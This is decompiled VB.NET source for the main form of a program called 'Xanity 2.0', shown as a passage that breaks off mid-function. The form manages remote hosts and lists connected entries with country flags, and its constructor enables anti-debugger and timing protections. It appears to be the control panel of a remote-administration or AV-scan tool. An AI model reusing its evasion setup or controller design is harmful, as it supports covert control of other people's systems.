Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Threading
Imports System.Windows.Forms
Imports Xanity_2._0.My
Imports Xanity_2._0.My.Resources

Namespace Xanity_2._0
    <DesignerGenerated> _
    Public Class Form1
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.Resize, New EventHandler(AddressOf Me.Form1_Resize)
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.Form1_FormClosing)
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.Form1_Load)
            Form1.__ENCAddToList(Me)
            Me.client = New API
            Me.host = New ToolStripMenuItem(10  - 1) {}
            Me.i = 0
            Me.connected = New Boolean(10  - 1) {}
            Me.groupparameter = 1
            Me.onc = 1
            Me.av = New String(&H25  - 1) {}
            Me.scan = New String(&H25  - 1) {}
            Me.avscan = New String(&H25  - 1) {}
            Try 
                LicenseGlobal.Seal.Catch = True
                LicenseGlobal.Seal.Protection = (RuntimeProtection.Debuggers Or (RuntimeProtection.DebuggersEx Or (RuntimeProtection.Parent Or RuntimeProtection.Timing)))
                Me.InitializeComponent
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Private Shared Sub __ENCAddToList(ByVal value As Object)
            Dim list As List(Of WeakReference) = Form1.__ENCList
            SyncLock list
                If (Form1.__ENCList.Count = Form1.__ENCList.Capacity) Then
                    Dim index As Integer = 0
                    Dim num3 As Integer = (Form1.__ENCList.Count - 1)
                    Dim i As Integer = 0
                    Do While (i <= num3)
                        Dim reference As WeakReference = Form1.__ENCList.Item(i)
                        If reference.IsAlive Then
                            If (i <> index) Then
                                Form1.__ENCList.Item(index) = Form1.__ENCList.Item(i)
                            End If
                            index += 1
                        End If
                        i += 1
                    Loop
                    Form1.__ENCList.RemoveRange(index, (Form1.__ENCList.Count - index))
                    Form1.__ENCList.Capacity = Form1.__ENCList.Count
                End If
                Form1.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
            End SyncLock
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__1(ByVal sender As Object, ByVal e As EventArgs)
            Me.connecttohost
        End Sub

        <CompilerGenerated, DebuggerStepThrough> _
        Private Sub _Lambda$__2(ByVal sender As Object, ByVal e As EventArgs)
            Me.connecttohost
        End Sub

        Public Sub additems(ByVal listview As ListView, ByVal [text] As String)
            listview.Items.Add([text])
        End Sub

        Private Sub AddNewToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim str As String = Interaction.InputBox("Please enter the Host!", "New Host", "", -1, -1)
                If (Strings.Right(str, 1) = "/") Then
                    str = str.Substring(0, (str.Length - 1))
                End If
                Me.host(Me.i) = New ToolStripMenuItem(str)
                If Not MySettingsProperty.Settings.hosts.Contains(Me.host(Me.i).Text) Then
                    Dim settings As MySettings = MySettingsProperty.Settings
                    settings.hosts = (settings.hosts & "|" & Me.host(Me.i).Text)
                    MySettingsProperty.Settings.Save
                    Dim item As ToolStripItem = Me.ConnectToolStripMenuItem.DropDownItems.Add(Me.host(Me.i).ToString)
                    item.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
                    item.ForeColor = Color.White
                    item.Image = Resources.host
                    item = Nothing
                    Me.i += 1
                End If
                Dim num3 As Integer = Me.CountCharacter(MySettingsProperty.Settings.hosts, "|"c)
                Dim i As Integer = 1
                Do While (i <= num3)
                    AddHandler Me.ConnectToolStripMenuItem.DropDownItems.Item(i).Click, New EventHandler(AddressOf Me._Lambda$__2)
                    Me.ConnectToolStripMenuItem.DropDownItems.Item(i).Image = Resources.host
                    i += 1
                Loop
                Me.boxhosts.Clear
                Dim num4 As Integer = (Me.CountCharacter(MySettingsProperty.Settings.hosts, "|"c) - 1)
                Dim j As Integer = 0
                Do While (j <= num4)
                    Dim str2 As String = MySettingsProperty.Settings.hosts.Remove(0, 1)
                    Me.boxhosts.AddItem(str2.Split(New Char() { "|"c })(j))
                    j += 1
                Loop
            Catch exception1 As IndexOutOfRangeException
                ProjectData.SetProjectError(exception1)
                Me.AddtoStatusBar("You are only allowed to have 10 Hosts!")
                ProjectData.ClearProjectError
            Catch exception3 As Exception
                ProjectData.SetProjectError(exception3)
                Dim exception2 As Exception = exception3
                Interaction.MsgBox(exception2.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub addsubitems(ByVal listview As ListView, ByVal [text] As String, ByVal index As Integer)
            listview.Items.Item(index).SubItems.Add([text])
        End Sub

        Public Function addtofakelistview(ByVal [text] As String, ByVal Optional hostindex As Integer = 0, ByVal Optional hostindx As String = "null") As Object
            Dim obj2 As Object
            Try 
                If ([text].Length <= 0) Then
                    Return obj2
                End If
                [text] = [text].Remove(0, 1)
                Dim num As Integer = Me.CountCharacter([text], "*"c)
                Dim strArray5 As String() = New String((num + 1)  - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    strArray5(i) = [text].Split(New Char() { "*"c })(i)
                    i += 1
                Loop
                Dim strArray6 As String() = New String((num + 1)  - 1) {}
                Dim strArray2 As String() = New String((num + 1)  - 1) {}
                Dim strArray As String() = New String((num + 1)  - 1) {}
                Dim strArray3 As String() = New String((num + 1)  - 1) {}
                Dim strArray7 As String() = New String((num + 1)  - 1) {}
                Dim strArray4 As String() = New String((num + 1)  - 1) {}
                Me.updateserver.Start
                Dim num5 As Integer = num
                Dim j As Integer = 0
                Do While (j <= num5)
                    Dim strArray8 As String()
                    Dim num6 As Integer
                    Dim objArray As Object()
                    Dim objArray2 As Object()
                    Dim flagArray As Boolean()
                    Dim strArray9 As String()
                    Dim num7 As Integer
                    Dim objArray3 As Object()
                    Dim objArray4 As Object()
                    Dim flagArray2 As Boolean()
                    strArray6(j) = strArray5(j).Split(New Char() { "|"c })(1)
                    strArray2(j) = strArray5(j).Split(New Char() { "|"c })(0)
                    strArray(j) = strArray5(j).Split(New Char() { "|"c })(2)
                    strArray3(j) = strArray5(j).Split(New Char() { "|"c })(3)
                    strArray7(j) = strArray5(j).Split(New Char() { "|"c })(4)
                    strArray4(j) = strArray5(j).Split(New Char() { "|"c })(5)
                    If (hostindex = 0) Then
                        Dim obj3 As Object
                        objArray = New Object(2  - 1) {}
                        strArray8 = strArray
                        num6 = j
                        objArray(0) = strArray8(num6)
                        objArray(1) = RuntimeHelpers.GetObjectValue(Me.CountryFlag(strArray(j)))
                        objArray2 = objArray
                        flagArray = New Boolean() { True, False }
                        If Not flagArray(0) Then
                            obj3 = NewLateBinding.LateGet(Me.ListView1.Items, Nothing, "Add", objArray2, Nothing, Nothing, flagArray)
                        Else
                            strArray8(num6) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2(0)), GetType(String)))
                            obj3 = NewLateBinding.LateGet(Me.ListView1.Items, Nothing, "Add", objArray2, Nothing, Nothing, flagArray)
                        End If
                        objArray3 = New Object(1  - 1) {}
                        strArray9 = strArray6
                        num7 = j
                        objArray3(0) = strArray9(num7)
                        objArray4 = objArray3
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray4, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray2
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray3
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray4
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray7
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray3 = New Object() { hostindx }
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "Subitems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            hostindx = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        obj3 = Nothing
                    Else
                        Dim obj4 As Object
                        objArray4 = New Object(2  - 1) {}
                        strArray9 = strArray
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray4(1) = RuntimeHelpers.GetObjectValue(Me.CountryFlag(strArray(j)))
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True, False }
                        If Not flagArray2(0) Then
                            obj4 = NewLateBinding.LateGet(Me.ListView1.Items, Nothing, "Add", objArray3, Nothing, Nothing, flagArray2)
                        Else
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                            obj4 = NewLateBinding.LateGet(Me.ListView1.Items, Nothing, "Add", objArray3, Nothing, Nothing, flagArray2)
                        End If
                        objArray2 = New Object(1  - 1) {}
                        strArray8 = strArray6
                        num6 = j
                        objArray2(0) = strArray8(num6)
                        objArray = objArray2
                        flagArray = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            strArray8(num6) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray2
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray3
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray4
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray7
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        Dim item As ToolStripItem = Me.ConnectToolStripMenuItem.DropDownItems.Item(hostindex)
                        objArray4(0) = item.Text
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "Subitems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            item.Text = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        obj4 = Nothing
                    End If
                    j += 1
                Loop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
            Return obj2
        End Function

        Public Function addtolistview(ByVal [text] As String, ByVal Optional hostindex As Integer = 0, ByVal Optional hostindx As String = "null") As Object
            Dim obj2 As Object
            Try 
                If ([text].Length <= 0) Then
                    Return obj2
                End If
                [text] = [text].Remove(0, 1)
                Dim num As Integer = Me.CountCharacter([text], "*"c)
                Dim strArray5 As String() = New String((num + 1)  - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    strArray5(i) = [text].Split(New Char() { "*"c })(i)
                    i += 1
                Loop
                Dim strArray6 As String() = New String((num + 1)  - 1) {}
                Dim strArray2 As String() = New String((num + 1)  - 1) {}
                Dim strArray As String() = New String((num + 1)  - 1) {}
                Dim strArray3 As String() = New String((num + 1)  - 1) {}
                Dim strArray7 As String() = New String((num + 1)  - 1) {}
                Dim strArray4 As String() = New String((num + 1)  - 1) {}
                Me.updateserver.Start
                Dim num5 As Integer = num
                Dim j As Integer = 0
                Do While (j <= num5)
                    Dim strArray8 As String()
                    Dim num6 As Integer
                    Dim objArray As Object()
                    Dim objArray2 As Object()
                    Dim flagArray As Boolean()
                    Dim strArray9 As String()
                    Dim num7 As Integer
                    Dim objArray3 As Object()
                    Dim objArray4 As Object()
                    Dim flagArray2 As Boolean()
                    strArray6(j) = strArray5(j).Split(New Char() { "|"c })(1)
                    strArray2(j) = strArray5(j).Split(New Char() { "|"c })(0)
                    strArray(j) = strArray5(j).Split(New Char() { "|"c })(2)
                    strArray3(j) = strArray5(j).Split(New Char() { "|"c })(3)
                    strArray7(j) = strArray5(j).Split(New Char() { "|"c })(4)
                    strArray4(j) = strArray5(j).Split(New Char() { "|"c })(5)
                    If (hostindex = 0) Then
                        Dim obj3 As Object
                        objArray = New Object(2  - 1) {}
                        strArray8 = strArray
                        num6 = j
                        objArray(0) = strArray8(num6)
                        objArray(1) = RuntimeHelpers.GetObjectValue(Me.CountryFlag(strArray(j)))
                        objArray2 = objArray
                        flagArray = New Boolean() { True, False }
                        If Not flagArray(0) Then
                            obj3 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray2, Nothing, Nothing, flagArray)
                        Else
                            strArray8(num6) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2(0)), GetType(String)))
                            obj3 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray2, Nothing, Nothing, flagArray)
                        End If
                        objArray3 = New Object(1  - 1) {}
                        strArray9 = strArray6
                        num7 = j
                        objArray3(0) = strArray9(num7)
                        objArray4 = objArray3
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray4, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray2
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray3
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray4
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray7
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray3 = New Object() { hostindx }
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "Subitems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            hostindx = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        obj3 = Nothing
                    Else
                        Dim obj4 As Object
                        objArray4 = New Object(2  - 1) {}
                        strArray9 = strArray
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray4(1) = RuntimeHelpers.GetObjectValue(Me.CountryFlag(strArray(j)))
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True, False }
                        If Not flagArray2(0) Then
                            obj4 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray3, Nothing, Nothing, flagArray2)
                        Else
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                            obj4 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray3, Nothing, Nothing, flagArray2)
                        End If
                        objArray2 = New Object(1  - 1) {}
                        strArray8 = strArray6
                        num6 = j
                        objArray2(0) = strArray8(num6)
                        objArray = objArray2
                        flagArray = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            strArray8(num6) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray2
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray3
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray4
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray7
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        Dim item As ToolStripItem = Me.ConnectToolStripMenuItem.DropDownItems.Item(hostindex)
                        objArray4(0) = item.Text
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "Subitems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            item.Text = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        obj4 = Nothing
                    End If
                    j += 1
                Loop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
            Return obj2
        End Function

        Public Function addtolistview2(ByVal [text] As String, ByVal Optional hostindex As Integer = 0, ByVal Optional hostindx As String = "null") As Object
            Dim obj2 As Object
            Try 
                If ([text].Length <= 0) Then
                    Return obj2
                End If
                Dim num As Integer = Me.CountCharacter([text], "*"c)
                Dim strArray5 As String() = New String((num + 1)  - 1) {}
                Dim num4 As Integer = num
                Dim i As Integer = 0
                Do While (i <= num4)
                    strArray5(i) = [text].Split(New Char() { "*"c })(i)
                    i += 1
                Loop
                Dim strArray6 As String() = New String((num + 1)  - 1) {}
                Dim strArray2 As String() = New String((num + 1)  - 1) {}
                Dim strArray As String() = New String((num + 1)  - 1) {}
                Dim strArray3 As String() = New String((num + 1)  - 1) {}
                Dim strArray7 As String() = New String((num + 1)  - 1) {}
                Dim strArray4 As String() = New String((num + 1)  - 1) {}
                Me.updateserver.Start
                Dim num5 As Integer = num
                Dim j As Integer = 0
                Do While (j <= num5)
                    Dim strArray8 As String()
                    Dim num6 As Integer
                    Dim objArray As Object()
                    Dim objArray2 As Object()
                    Dim flagArray As Boolean()
                    Dim strArray9 As String()
                    Dim num7 As Integer
                    Dim objArray3 As Object()
                    Dim objArray4 As Object()
                    Dim flagArray2 As Boolean()
                    strArray6(j) = strArray5(j).Split(New Char() { "|"c })(1)
                    strArray2(j) = strArray5(j).Split(New Char() { "|"c })(0)
                    strArray(j) = strArray5(j).Split(New Char() { "|"c })(2)
                    strArray3(j) = strArray5(j).Split(New Char() { "|"c })(3)
                    strArray7(j) = strArray5(j).Split(New Char() { "|"c })(4)
                    strArray4(j) = strArray5(j).Split(New Char() { "|"c })(5)
                    If (hostindex = 0) Then
                        Dim obj3 As Object
                        objArray = New Object(2  - 1) {}
                        strArray8 = strArray
                        num6 = j
                        objArray(0) = strArray8(num6)
                        objArray(1) = RuntimeHelpers.GetObjectValue(Me.CountryFlag(strArray(j)))
                        objArray2 = objArray
                        flagArray = New Boolean() { True, False }
                        If Not flagArray(0) Then
                            obj3 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray2, Nothing, Nothing, flagArray)
                        Else
                            strArray8(num6) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2(0)), GetType(String)))
                            obj3 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray2, Nothing, Nothing, flagArray)
                        End If
                        objArray3 = New Object(1  - 1) {}
                        strArray9 = strArray6
                        num7 = j
                        objArray3(0) = strArray9(num7)
                        objArray4 = objArray3
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray4, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray4(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray2
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray3
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray4
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray7
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
